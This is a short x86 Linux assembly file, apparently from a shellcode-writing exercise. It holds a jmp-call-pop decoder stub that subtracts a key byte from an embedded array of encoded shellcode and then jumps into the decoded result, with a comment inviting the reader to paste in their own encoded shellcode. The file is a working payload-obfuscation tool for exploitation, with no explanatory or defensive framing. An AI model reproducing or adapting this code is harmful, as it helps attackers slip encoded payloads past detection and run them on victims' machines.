global _start
section .text

        _start:
		xor ecx, ecx
		mul ecx
                jmp short call_decoder
		
        decoder:
                pop esi ; shellcode's address	
		mov edi, [esi+len-1]	; key
		xor [esi+len-1], edi
                
	decode:
                sub [esi], edi
		inc al
		jz shellcode
		inc esi
		jmp short decode


        call_decoder:
                call decoder
                ; paste the encoded shellcode below
		shellcode: db 0x49,0xd8,0x68,0x80,0x47,0x47,0x8b,0x80,0x80,0x47,0x7a,0x81,0x86,0xa1,0xfb,0xa1,0xd9,0xa1,0xda,0xc8,0x23,0xe5,0x98,0x49,0xd8,0x58,0xe5,0x98,0x18
		len: equ $-shellcode
